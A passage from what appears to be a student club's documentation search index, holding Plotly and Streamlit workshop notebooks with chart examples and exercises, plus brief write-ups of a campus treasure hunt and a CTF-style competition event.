color='medal', \n             title='Medal Count for Olympic Short Track Speed Skating')\nfig.show()\n</pre> medals = px.data.medals_long(indexed=False)  fig = px.bar(medals, x='nation', y='count', color='medal',               title='Medal Count for Olympic Short Track Speed Skating') fig.show() <p>Let us derive some insights:</p> In\u00a0[\u00a0]: Copied! <pre>medals = px.data.medals_long(indexed=False)\n\n# Calculate the total medal count for each nation\ntotal_medals = medals.groupby('nation')['count'].sum()\n\n# Calculate the percentage of each medal for each nation\nmedals['percentage'] = medals['count'] / total_medals[medals['nation']].values * 100\n\n# Create a new column with the medal count and percentage as a string\nmedals['text'] = medals['count'].astype(str) + ' (' + medals['percentage'].round(1).astype(str) + '%)'\n\nfig = px.bar(medals, \n             x='nation', y='count', \n             color='medal', \n             title='Medal Count for Olympic Short Track Speed Skating',\n             custom_data=['percentage'],\n             text='text')\n\nfig.show()\n</pre> medals = px.data.medals_long(indexed=False)  # Calculate the total medal count for each nation total_medals = medals.groupby('nation')['count'].sum()  # Calculate the percentage of each medal for each nation medals['percentage'] = medals['count'] / total_medals[medals['nation']].values * 100  # Create a new column with the medal count and percentage as a string medals['text'] = medals['count'].astype(str) + ' (' + medals['percentage'].round(1).astype(str) + '%)'  fig = px.bar(medals,               x='nation', y='count',               color='medal',               title='Medal Count for Olympic Short Track Speed Skating',              custom_data=['percentage'],              text='text')  fig.show() In\u00a0[\u00a0]: Copied! <pre>df = px.data.gapminder()\nprint(df.columns)\nprint(df.head)\n</pre> df = px.data.gapminder() print(df.columns) print(df.head) <pre>Index(['country', 'continent', 'year', 'lifeExp', 'pop', 'gdpPercap',\n       'iso_alpha', 'iso_num'],\n      dtype='object')\n&lt;bound method NDFrame.head of           country continent  year  lifeExp       pop   gdpPercap iso_alpha  \\\n0     Afghanistan      Asia  1952   28.801   8425333  779.445314       AFG   \n1     Afghanistan      Asia  1957   30.332   9240934  820.853030       AFG   \n2     Afghanistan      Asia  1962   31.997  10267083  853.100710       AFG   \n3     Afghanistan      Asia  1967   34.020  11537966  836.197138       AFG   \n4     Afghanistan      Asia  1972   36.088  13079460  739.981106       AFG   \n...           ...       ...   ...      ...       ...         ...       ...   \n1699     Zimbabwe    Africa  1987   62.351   9216418  706.157306       ZWE   \n1700     Zimbabwe    Africa  1992   60.377  10704340  693.420786       ZWE   \n1701     Zimbabwe    Africa  1997   46.809  11404948  792.449960       ZWE   \n1702     Zimbabwe    Africa  2002   39.989  11926563  672.038623       ZWE   \n1703     Zimbabwe    Africa  2007   43.487  12311143  469.709298       ZWE   \n\n      iso_num  \n0           4  \n1           4  \n2           4  \n3           4  \n4           4  \n...       ...  \n1699      716  \n1700      716  \n1701      716  \n1702      716  \n1703      716  \n\n[1704 rows x 8 columns]&gt;\n</pre> In\u00a0[\u00a0]: Copied! <pre>gapminder = px.data.gapminder()\n\n# Filter the dataset to include only data from the year 2007\ngapminder_2007 = gapminder[gapminder['year'] == 2007]\n\n# Group the data by continent and calculate the sum of the population for each continent\ngrouped_data = gapminder_2007.groupby('continent', as_index=False)['pop'].sum()\n\n# Rename the columns to match the names expected by px.pie\n# grouped_data = grouped_data.rename(columns={'continent': 'names', 'pop': 'values'})\n\n# Assign the result to df\ndf = grouped_data\ndf.head()\n</pre> gapminder = px.data.gapminder()  # Filter the dataset to include only data from the year 2007 gapminder_2007 = gapminder[gapminder['year'] == 2007]  # Group the data by continent and calculate the sum of the population for each continent grouped_data = gapminder_2007.groupby('continent', as_index=False)['pop'].sum()  # Rename the columns to match the names expected by px.pie # grouped_data = grouped_data.rename(columns={'continent': 'names', 'pop': 'values'})  # Assign the result to df df = grouped_data df.head() Out[\u00a0]: continent pop 0 Africa 929539692 1 Americas 898871184 2 Asia 3811953827 3 Europe 586098529 4 Oceania 24549947 In\u00a0[\u00a0]: Copied! <pre>fig = px.pie(df, values='pop', names='continent', title='World Population by Continent (2007)')\n# fig.update_traces(textinfo = \"label+percent\")\nfig.show()\n</pre> fig = px.pie(df, values='pop', names='continent', title='World Population by Continent (2007)') # fig.update_traces(textinfo = \"label+percent\") fig.show() In\u00a0[\u00a0]: Copied! <pre>from plotly.subplots import make_subplots\n\nfig = make_subplots(rows=2, cols=2, \n                    subplot_titles=(\"Linear\", \"Square\", \"Cube\", \"Quarted\"))\n\nx = np.arange(-30, 30)\n\nfig.add_trace(go.Scatter(x=x, y=x**1, mode='markers'),\n              row=1, col=1)\n\nfig.add_trace(go.Scatter(x=x, y=x**2, mode='markers'),\n              row=1, col=2)\n\nfig.add_trace(go.Scatter(x=x, y=x**3, mode='markers'),\n              row=2, col=1)\n\nfig.add_trace(go.Scatter(x=x, y=x**4, mode='markers'),\n              row=2, col=2)\n\nfig.update_layout(showlegend=False, title=\"What Nice Graphs!\")\n\n\nfig.show()\n</pre> from plotly.subplots import make_subplots  fig = make_subplots(rows=2, cols=2,                      subplot_titles=(\"Linear\", \"Square\", \"Cube\", \"Quarted\"))  x = np.arange(-30, 30)  fig.add_trace(go.Scatter(x=x, y=x**1, mode='markers'),               row=1, col=1)  fig.add_trace(go.Scatter(x=x, y=x**2, mode='markers'),               row=1, col=2)  fig.add_trace(go.Scatter(x=x, y=x**3, mode='markers'),               row=2, col=1)  fig.add_trace(go.Scatter(x=x, y=x**4, mode='markers'),               row=2, col=2)  fig.update_layout(showlegend=False, title=\"What Nice Graphs!\")   fig.show() <ol> <li>Global population is increasing.</li> </ol> In\u00a0[\u00a0]: Copied! <pre>import plotly.express as px\n\n# Load the Gapminder dataset\ngapminder = px.data.gapminder()\n\n# Group the data by year and calculate the sum of the population for each year\ngrouped_data = gapminder.groupby('year', as_index=False)['pop'].sum()\n\n# Create a line chart showing global population over time\nfig = px.line(grouped_data, x='year', y='pop', title='Global Population Over Time')\nfig.show()\n</pre> import plotly.express as px  # Load the Gapminder dataset gapminder = px.data.gapminder()  # Group the data by year and calculate the sum of the population for each year grouped_data = gapminder.groupby('year', as_index=False)['pop'].sum()  # Create a line chart showing global population over time fig = px.line(grouped_data, x='year', y='pop', title='Global Population Over Time') fig.show() <p>The chart shows that the total world population has been steadily increasing over time.</p> <ol> <li>Life expectancy has been increasing.</li> </ol> In\u00a0[\u00a0]: Copied! <pre>import plotly.express as px\n\n# Load the Gapminder dataset\ngapminder = px.data.gapminder()\n# print(gapminder.columns)\n\n# Create a scatter plot showing life expectancy vs. time\nfig = px.scatter(gapminder, x='year', y='lifeExp', trendline='lowess', title='Life Expectancy Over Time')\nfig.show()\n</pre> import plotly.express as px  # Load the Gapminder dataset gapminder = px.data.gapminder() # print(gapminder.columns)  # Create a scatter plot showing life expectancy vs. time fig = px.scatter(gapminder, x='year', y='lifeExp', trendline='lowess', title='Life Expectancy Over Time') fig.show() <p>The plot shows that life expectancy has been increasing around the world.</p> <ol> <li>There is a correlation between GDP per capita and life expectancy.</li> </ol> In\u00a0[\u00a0]: Copied! <pre>import plotly.express as px\n\n# Load the Gapminder dataset\ngapminder = px.data.gapminder()\n\n# Create a scatter plot showing life expectancy vs. GDP per capita\nfig = px.scatter(gapminder, x='gdpPercap', y='lifeExp', color='continent', title='Life Expectancy vs. GDP Per Capita')\nfig.show()\n</pre> import plotly.express as px  # Load the Gapminder dataset gapminder = px.data.gapminder()  # Create a scatter plot showing life expectancy vs. GDP per capita fig = px.scatter(gapminder, x='gdpPercap', y='lifeExp', color='continent', title='Life Expectancy vs. GDP Per Capita') fig.show() <p>This code creates a scatter plot showing the relationship between life expectancy and GDP per capita. The plot shows that there is a clear correlation between the two variables, with countries with higher GDP per capita tending to have higher life expectancies.</p> <ol> <li>There are significant differences in GDP per capita between countries.</li> </ol> In\u00a0[\u00a0]: Copied! <pre>import plotly.express as px\n\n# Load the Gapminder dataset\ngapminder = px.data.gapminder()\n\n# Create a box plot showing GDP per capita by continent\nfig = px.box(gapminder, x='continent', y='gdpPercap', title='GDP Per Capita by Continent')\nfig.show()\n</pre> import plotly.express as px  # Load the Gapminder dataset gapminder = px.data.gapminder()  # Create a box plot showing GDP per capita by continent fig = px.box(gapminder, x='continent', y='gdpPercap', title='GDP Per Capita by Continent') fig.show() <p>This code creates a box plot showing GDP per capita by continent. The plot shows that there are significant differences in GDP per capita between continents, with North America and Europe having much higher GDP per capita than Asia, Africa, and South America.</p> In\u00a0[\u00a0]: Copied! <pre>df = px.data.gapminder()\ndf_2007 = df.query(\"year==2007\")\n\n# [\"plotly\", \"plotly_white\", \"plotly_dark\", \"ggplot2\", \"seaborn\", \"simple_white\", \"none\"]\n\nfor template in [\"plotly\", \"plotly_dark\"]:\n    fig = px.scatter(df_2007,\n                     x=\"gdpPercap\", y=\"lifeExp\", size=\"pop\", color=\"continent\",\n                    #  text = \"country\",\n                    #  labels={'gdpPercap':'GDP per Capita','lifeExp':'Life Expectancy','pop':'Total Population'},\n                     log_x=True, size_max=60,\n                     template=template, title=\"Gapminder 2007: '%s' theme\" % template)\n    fig.show()\n</pre> df = px.data.gapminder() df_2007 = df.query(\"year==2007\")  # [\"plotly\", \"plotly_white\", \"plotly_dark\", \"ggplot2\", \"seaborn\", \"simple_white\", \"none\"]  for template in [\"plotly\", \"plotly_dark\"]:     fig = px.scatter(df_2007,                      x=\"gdpPercap\", y=\"lifeExp\", size=\"pop\", color=\"continent\",                     #  text = \"country\",                     #  labels={'gdpPercap':'GDP per Capita','lifeExp':'Life Expectancy','pop':'Total Population'},                      log_x=True, size_max=60,                      template=template, title=\"Gapminder 2007: '%s' theme\" % template)     fig.show() <p>Surface Graph:</p> In\u00a0[\u00a0]: Copied! <pre>z_data = pd.read_csv(\"https://raw.githubusercontent.com/plotly/datasets/master/api_docs/mt_bruno_elevation.csv\")\n\nprint(z_data.head())\n\nfig = go.Figure(\n    data=go.Surface(z=z_data.values),\n    layout=go.Layout(\n        title=\"Mt Bruno Elevation\"\n        # width=500,\n        # height=500,\n    ))\n\nfig.update_layout(title=\"Mt Bruno Elevation:\")\nfig.show()\n</pre> z_data = pd.read_csv(\"https://raw.githubusercontent.com/plotly/datasets/master/api_docs/mt_bruno_elevation.csv\")  print(z_data.head())  fig = go.Figure(     data=go.Surface(z=z_data.values),     layout=go.Layout(         title=\"Mt Bruno Elevation\"         # width=500,         # height=500,     ))  fig.update_layout(title=\"Mt Bruno Elevation:\") fig.show() <pre>   Unnamed: 0          0         1          2          3          4  \\\n0           0  27.809850  49.61936  83.080670  116.66320  130.41400   \n1           1  27.719660  48.55022  65.213740   95.27666  116.99640   \n2           2  30.426700  33.47752  44.809530   62.47495   77.43523   \n3           3  16.665490  30.10860  39.969520   44.12225   59.57512   \n4           4   8.815617  18.35160   8.658275   27.58590   48.62691   \n\n           5         6         7         8  ...        14        15        16  \\\n0  150.72060  220.1871  156.1536  148.6416  ...  49.96142  21.89279  17.02552   \n1  133.90560  152.3412  151.9340  160.1139  ...  33.08871  38.40972  44.24843   \n2  104.21530  102.7393  137.0004  186.0706  ...  48.47132  74.71461  60.09090   \n3   77.56929  106.8925  166.5539  175.2381  ...  60.55916  55.92124  15.17284   \n4   60.18013   91.3286  145.7109  116.0653  ...  47.42691  69.20731  44.95468   \n\n          17         18         19         20         21         22         23  \n0  11.743170  14.752260  13.667100   5.677561   3.312340   1.156517  -0.147662  \n1  69.578600   4.019351   3.050024   3.039719   2.996142   2.967954   1.999594  \n2   7.073525   6.089851   6.537450   6.666096   7.306965   5.736840   3.625628  \n3   8.248324  36.680870  61.934130  20.268670  68.588190  46.498120   0.236010  \n4  29.171970  17.916740  16.255150  14.655590  17.260480  31.222450  46.717040  \n\n[5 rows x 25 columns]\n</pre> <p>Easy: Create a scatter plot using the px.data.iris dataset, where the x-axis is the \"sepal length (cm)\" and the y-axis is the \"sepal width (cm)\". Set the color of the points to be determined by the \"species\" column.</p> In\u00a0[\u00a0]: Copied! <pre>import plotly.express as px\n\ndf = px.data.iris()\n\nfig = px.scatter(df, x=\"sepal_length\", y=\"sepal_width\", color=\"species\")\nfig.show()\n</pre> import plotly.express as px  df = px.data.iris()  fig = px.scatter(df, x=\"sepal_length\", y=\"sepal_width\", color=\"species\") fig.show() <p>Hard: Create a line chart using the px.data.stocks dataset that shows the daily stock price data for a specific company (e.g. Apple, Google, Amazon, etc.) over time. Customize the chart so that the x-axis shows the date and the y-axis shows the stock price and the chart so that the line is blue and has a width of 2.</p> In\u00a0[\u00a0]: Copied! <pre>import plotly.graph_objs as go\nimport pandas as pd\n\nstocks_df = px.data.stocks()\nprint(stocks_df.columns)\n\n# Define the company to display\ncompany = 'AAPL'\n# Load the stock price data and filter for the selected company\nstocks_df = stocks_df[[\"date\", company]]\nstocks_df.columns = [\"Date\", \"Price\"]\n\n# dropna() is a method in pandas library that is used to remove any rows with missing or null values in a pandas DataFrame.\n# stocks_df = stocks_df.dropna()\n\n# Convert the Date column to a datetime object\nstocks_df[\"Date\"] = pd.to_datetime(stocks_df[\"Date\"])\n\n# Define the line chart trace\nline_trace = go.Scatter(x=stocks_df[\"Date\"],\n                        y=stocks_df[\"Price\"],\n                        mode=\"lines\",\n                        name=f\"{company} Stock Price\",\n                        line=dict(color=\"blue\", width=2))\n\n# Create the plot with the line chart trace\nfig = go.Figure(data=[line_trace])\n\n# Set the chart layout\nfig.update_layout(title=f\"{company} Stock Price\",\n                  xaxis_title=\"Date\",\n                  yaxis_title=\"Price\")\n\n# Show the chart\nfig.show()\n</pre> import plotly.graph_objs as go import pandas as pd  stocks_df = px.data.stocks() print(stocks_df.columns)  # Define the company to display company = 'AAPL' # Load the stock price data and filter for the selected company stocks_df = stocks_df[[\"date\", company]] stocks_df.columns = [\"Date\", \"Price\"]  # dropna() is a method in pandas library that is used to remove any rows with missing or null values in a pandas DataFrame. # stocks_df = stocks_df.dropna()  # Convert the Date column to a datetime object stocks_df[\"Date\"] = pd.to_datetime(stocks_df[\"Date\"])  # Define the line chart trace line_trace = go.Scatter(x=stocks_df[\"Date\"],                         y=stocks_df[\"Price\"],                         mode=\"lines\",                         name=f\"{company} Stock Price\",                         line=dict(color=\"blue\", width=2))  # Create the plot with the line chart trace fig = go.Figure(data=[line_trace])  # Set the chart layout fig.update_layout(title=f\"{company} Stock Price\",                   xaxis_title=\"Date\",                   yaxis_title=\"Price\")  # Show the chart fig.show()  <pre>Index(['date', 'GOOG', 'AAPL', 'AMZN', 'FB', 'NFLX', 'MSFT'], dtype='object')\n</pre> <p>Advanced:</p> <p>Create a candlestick chart using the plotly.data.stocks dataset that shows the daily stock price data for a specific company (e.g. Apple, Google, Amazon, etc.). Customize the chart so that the color of the candlestick changes depending on whether the stock price went up or down that day. Additionally, add a horizontal line to the chart at the average stock price for the selected company.</p> <p>Hint: You can use the plotly.graph_objs module to create the candlestick chart and the horizontal line, and the pd.DataFrame function from the pandas module to filter and preprocess the data.</p> In\u00a0[\u00a0]: Copied! <pre>import plotly.graph_objs as go\nimport pandas as pd\n\n# Define the company to display\ncompany = 'AAPL'\nstocks_df = px.data.stocks()\nprint(stocks_df.columns)\n# Load the stock price data and filter for the selected company\nstocks_df = stocks_df[[\"date\", company]]\n\n# Rename\nstocks_df.columns = [\"Date\", \"Price\"]\nstocks_df = stocks_df.dropna()\n\n# Convert the Date column to a datetime object\nstocks_df[\"Date\"] = pd.to_datetime(stocks_df[\"Date\"])\n\n# Add a new column for whether the stock price went up or down that day\nstocks_df[\"Change\"] = (stocks_df[\"Price\"] - stocks_df[\"Price\"].shift(1)) &gt; 0\nstocks_df.loc[stocks_df.index[0], \"Change\"] = False\n\n# Define the candlestick chart trace\ncandlestick_trace = go.Candlestick(x=stocks_df[\"Date\"],\n                                   open=stocks_df[\"Price\"],\n                                   high=stocks_df[\"Price\"],\n                                   low=stocks_df[\"Price\"],\n                                   close=stocks_df[\"Price\"],\n                                   increasing=dict(line=dict(color=\"Green\")), #00CC94\n                                   decreasing=dict(line=dict(color=\"Red\"))) #F50000\n\n# Define the horizontal line trace for the average stock price\navg_price = stocks_df[\"Price\"].mean()\nline_trace = go.Scatter(x=[stocks_df[\"Date\"].iloc[0], stocks_df[\"Date\"].iloc[-1]],\n                        y=[avg_price, avg_price],\n                        name=\"Average Price\",\n                        line=dict(color=\"Grey\", dash=\"dash\")) #7F7F7F\n\n# Create the plot with the candlestick chart and the horizontal line\nfig = go.Figure(data=[candlestick_trace, line_trace])\n\n# Set the chart layout\nfig.update_layout(title=f\"{company} Stock Price\",\n                  yaxis_title=\"Price\",\n                  xaxis_rangeslider_visible=False)\n\n# Show the chart\nfig.show()\n</pre> import plotly.graph_objs as go import pandas as pd  # Define the company to display company = 'AAPL' stocks_df = px.data.stocks() print(stocks_df.columns) # Load the stock price data and filter for the selected company stocks_df = stocks_df[[\"date\", company]]  # Rename stocks_df.columns = [\"Date\", \"Price\"] stocks_df = stocks_df.dropna()  # Convert the Date column to a datetime object stocks_df[\"Date\"] = pd.to_datetime(stocks_df[\"Date\"])  # Add a new column for whether the stock price went up or down that day stocks_df[\"Change\"] = (stocks_df[\"Price\"] - stocks_df[\"Price\"].shift(1)) &gt; 0 stocks_df.loc[stocks_df.index[0], \"Change\"] = False  # Define the candlestick chart trace candlestick_trace = go.Candlestick(x=stocks_df[\"Date\"],                                    open=stocks_df[\"Price\"],                                    high=stocks_df[\"Price\"],                                    low=stocks_df[\"Price\"],                                    close=stocks_df[\"Price\"],                                    increasing=dict(line=dict(color=\"Green\")), #00CC94                                    decreasing=dict(line=dict(color=\"Red\"))) #F50000  # Define the horizontal line trace for the average stock price avg_price = stocks_df[\"Price\"].mean() line_trace = go.Scatter(x=[stocks_df[\"Date\"].iloc[0], stocks_df[\"Date\"].iloc[-1]],                         y=[avg_price, avg_price],                         name=\"Average Price\",                         line=dict(color=\"Grey\", dash=\"dash\")) #7F7F7F  # Create the plot with the candlestick chart and the horizontal line fig = go.Figure(data=[candlestick_trace, line_trace])  # Set the chart layout fig.update_layout(title=f\"{company} Stock Price\",                   yaxis_title=\"Price\",                   xaxis_rangeslider_visible=False)  # Show the chart fig.show()  <pre>Index(['date', 'GOOG', 'AAPL', 'AMZN', 'FB', 'NFLX', 'MSFT'], dtype='object')\n</pre>"},{"location":"2022-2023/16_Plotly_Workshop/#python-data-visualization-with-plotly","title":"Python Data Visualization with Plotly\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#installation","title":"Installation\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#old-vs-new","title":"Old vs New\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#the-basics","title":"The Basics\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#bar-graph","title":"Bar Graph\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#pie-chart","title":"Pie Chart\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#visualize-maths","title":"Visualize Maths\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#deriving-insights-using-graphs","title":"Deriving Insights using Graphs\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#scatter-plot","title":"Scatter Plot\u00b6","text":""},{"location":"2022-2023/16_Plotly_Workshop/#exercises","title":"Exercises:\u00b6","text":""},{"location":"2023-2024/Competitions/01_Campus_Quest/","title":"01 Campus Quest","text":"<p>On 5<sup>th</sup> September, GDSC conducted a Treasure Hunt styled event called \"Campus Quest\" where students gathered in teams of 2-4 and embarked on an exciting adventure across our campus, where they'll unravel enigmatic riddles to unveil hidden QR codes and seize the grand prize!</p> <p>\ud83d\udcc5 Date: Tuesday, 5<sup>th</sup> September 2023  \ud83d\udd70 Time: 9:00 am - 3:00 pm  \ud83d\udccd Venue/Help-Desk: Area behind the Main Staircase</p> <p>Since this was our first event for the academic year, it was free for everyone to participate. We had an overwhelming participation of over 60 Teams, and a little over 100 participants. There were 2 Prize Categories, one was Open-to-all, and the other was the Freshers Category. Each category had a winning price of 40AED!</p> <p> </p>"},{"location":"2023-2024/Competitions/02_Google_Hacking/","title":"02 Google Hacking","text":"<p>On 6-7<sup>th</sup> October, GDSC conducted a CTF styled event called \"Google Hacking\" where students gathered in teams of 1-2 and embarked on an exciting adventure to prevent Kryptex from taking over our servers!</p> <p>\ud83d\udcc5 Date: Tuesday, 6-7<sup>th</sup> October 2023  \ud83d\udd70 Time: 5:00 pm - 5:00pm \ud83d\udccd Venue: Online</p> <p>Since this was our first competition for the academic year. We had an overwhelming participation of over 60 Teams, and a little over 100 participants. There were 2 Prize Categories, one was Open-to-all, and the other was the Freshers Category. Each category had a winning price of 40AED.</p> <p> </p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/","title":"Intro to Streamlit \ud83d\udcbb","text":"In\u00a0[\u00a0]: Copied! <pre>!pip install -q streamlit\n</pre> !pip install -q streamlit In\u00a0[\u00a0]: Copied! <pre>%%writefile app.py\n\nimport streamlit as st\n\nst.title('Hello *World!* :sunglasses:')\n</pre> %%writefile app.py  import streamlit as st  st.title('Hello *World!* :sunglasses:') <pre>Overwriting app.py\n</pre> In\u00a0[\u00a0]: Copied! <pre>!wget -q -O - ipv4.icanhazip.com\n! streamlit run app.py &amp; npx localtunnel --port 8501\n</pre> !wget -q -O - ipv4.icanhazip.com ! streamlit run app.py &amp; npx localtunnel --port 8501 <pre>34.86.89.52\n[..................] \\ fetchMetadata: sill resolveWithNewModule yargs@17.1.1 ch\nCollecting usage statistics. To deactivate, set browser.gatherUsageStats to False.\n\n\n  You can now view your Streamlit app in your browser.\n\n  Network URL: http://172.28.0.12:8501\n  External URL: http://34.86.89.52:8501\n\nnpx: installed 22 in 3.678s\nyour url is: https://eight-lions-give.loca.lt\n2023-09-26 08:09:45.286 Uncaught app exception\nTraceback (most recent call last):\n  File \"/usr/local/lib/python3.10/dist-packages/streamlit/runtime/scriptrunner/script_runner.py\", line 541, in _run_script\n    exec(code, module.__dict__)\n  File \"/content/app.py\", line 12, in &lt;module&gt;\n    result = float(num1) + float(num2)\nValueError: could not convert string to float: ''\n</pre> In\u00a0[\u00a0]: Copied! <pre>!pip install -q plotly\n</pre> !pip install -q plotly In\u00a0[\u00a0]: Copied! <pre>!pip show streamlit\n</pre> !pip show streamlit"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#intro-to-streamlit","title":"Intro to Streamlit \ud83d\udcbb\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#streamlit-is-an-open-source-python-library","title":"Streamlit is an open-source Python library.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#its-designed-for-creating-web-applications-with-minimal-code","title":"It's designed for creating web applications with minimal code.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#ideal-for-data-scientists-engineers-and-anyone-who-wants-to-share-data-and-insights-in-an-interactive-way","title":"Ideal for data scientists, engineers, and anyone who wants to share data and insights in an interactive way.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#why-streamlit","title":"Why Streamlit? \ud83e\udd14\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#streamlit-simplifies-web-app-development","title":"Streamlit simplifies web app development.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#no-need-for-html-css-or-javascript","title":"No need for HTML, CSS, or JavaScript.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#great-for-prototyping-data-visualization-and-sharing-insights","title":"Great for prototyping, data visualization, and sharing insights.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#workshop-goals","title":"Workshop Goals \ud83d\ude80\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#by-the-end-of-this-workshop-you-will","title":"By the end of this workshop, you will:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#understand-the-basics-of-streamlit","title":"Understand the basics of Streamlit.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#create-a-simple-streamlit-app","title":"Create a simple Streamlit app.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#learn-how-to-use-widgets","title":"Learn how to use widgets.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#see-examples-of-data-visualization","title":"See examples of data visualization.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#discover-deployment-options","title":"Discover deployment options.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#installation-and-set-up","title":"Installation and Set-up \u2b50\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#run-the-pip-install-command-on-your-google-collab","title":"Run the 'pip install' command on your Google Collab\u00b6","text":"<pre><code>!pip install -q streamlit\n</code></pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#-q-stands-for-quiet-mode-which-means-it-wont-display-progress-or-other-information-while-downloading","title":"* '-q' stands for \"quiet\" mode, which means it won't display progress or other information while downloading.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#your-first-streamlit-app","title":"Your first Streamlit App \ud83d\ude00\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#create-a-python-file","title":"Create a Python file:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#we-use-the-writefile-funtion-to-create-a-python-file-called-apppy","title":"We use the writefile funtion to create a Python file called app.py\u00b6","text":"<pre><code>%%writefile app.py\n\nimport streamlit as st\nst.title('Hello *World!* :sunglasses:')\n</code></pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#how-to-run-the-project","title":"How to run the project? \ud83c\udfc3\u00b6","text":"<p>The following command retrieves and displays your public IPv4 address. We need it to access the public URL.</p> <pre><code>!wget -q -O - ipv4.icanhazip.com\n</code></pre> <p>The following command runs a Streamlit web app locally and creates a public internet-accessible link for it</p> <pre><code>! streamlit run app.py &amp; npx localtunnel --port 8501\n</code></pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#official-streamlit-documentaion","title":"Official Streamlit Documentaion \ud83d\udcd6\u00b6","text":"<p>docs.streamlit.io</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#lets-take-a-look-at-some-basic-widgets","title":"Let's take a look at some basic widgets \ud83d\udc40\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#in-this-section-of-the-workshop-we-will-dive-into-the-world-of-streamlit-widgets-widgets-are-essential-components-that-allow-you-to-collect-user-input-making-your-streamlit-apps-interactive-and-user-friendly-well-explore-various-widgets-such-as-text-inputs-sliders-buttons-and-more-to-demonstrate-their-usage-well-build-a-basic-interactive-appa-simple-calculator","title":"In this section of the workshop, we will dive into the world of Streamlit widgets. Widgets are essential components that allow you to collect user input, making your Streamlit apps interactive and user-friendly. We'll explore various widgets such as text inputs, sliders, buttons, and more. To demonstrate their usage, we'll build a basic interactive app\u2014a simple calculator.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#1-text-inputs","title":"1. Text Inputs: \u2328\u00b6","text":"<p>Streamlit provides a straightforward way to collect text input from users. The primary widget for this purpose is 'st.text_input'. Let's see how it works:</p> <pre>user_input = st.text_input(\"Enter your name:\")\nst.write(\"Hello,\", user_input)\n</pre> <p>In this example, we create a text input widget with a label, \"Enter your name.\" The user's input is then displayed using st.write.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#2-sliders","title":"2. Sliders: \u25c0 \u25b6\u00b6","text":"<p>Sliders are useful for selecting numerical values within a specified range. Streamlit's 'st.slider' widget makes it easy to incorporate them into your apps:</p> <pre>age = st.slider(\"Select your age:\", 0, 100, 25) # (Min, Max, Start)\nst.write(\"You are\", age, \"years old.\")\n</pre> <p>Here, we create a slider for selecting the user's age, with a range from 0 to 100.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#3-buttons","title":"3. Buttons: \u23ef\u00b6","text":"<p>Buttons allow users to trigger actions. Streamlit's 'st.button' widget enables us to add buttons to our apps:</p> <pre>if st.button(\"Click me \ud83d\udc23\"):\n    st.write(\"Peeka-Boo \ud83d\udc7b\") #  '+ user_input'\n</pre> <p>This code displays a button labeled \"Click me.\" When clicked, it writes text to the app.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#a-simple-calculator","title":"A Simple Calculator: \ud83d\udd22\u00b6","text":"<p>Now, let's put these widgets together to create a basic interactive app\u2014a simple calculator. We'll use text inputs for numbers, radio buttons for selecting an operation, and a button to calculate the result.</p> <pre># Take user input\nnum1 = st.text_input(\"Enter the first number:\")\nnum2 = st.text_input(\"Enter the second number:\")\noperation = st.radio(\"Select an operation:\", (\"Add\", \"Subtract\", \"Multiply\", \"Divide\"))\n\n# if (num1!=\"\" and num2!=\"\"):\n\n# Perform the calculation\nif st.button(\"Calculate\"):\n    if operation == \"Add\":\n        result = float(num1) + float(num2)\n    elif operation == \"Subtract\":\n        result = float(num1) - float(num2)\n    elif operation == \"Multiply\":\n        result = float(num1) * float(num2)\n    elif operation == \"Divide\":\n        result = float(num1) / float(num2)\n    st.write(\"Result:\", result)\n</pre> <p>With this code, users can input two numbers, choose an operation, and then calculate the result by clicking the \"Calculate\" button.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#data-visualisation","title":"Data Visualisation: \ud83d\udcca\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#in-this-section-of-the-workshop-well-explore-how-to-integrate-data-visualization-libraries-such-as-plotly-with-streamlit-visualizing-data-is-a-crucial-aspect-of-data-science-and-analysis-and-streamlit-makes-it-easy-to-create-interactive-charts-and-graphs-in-your-web-apps","title":"In this section of the workshop, we'll explore how to integrate data visualization libraries, such as Plotly, with Streamlit. Visualizing data is a crucial aspect of data science and analysis, and Streamlit makes it easy to create interactive charts and graphs in your web 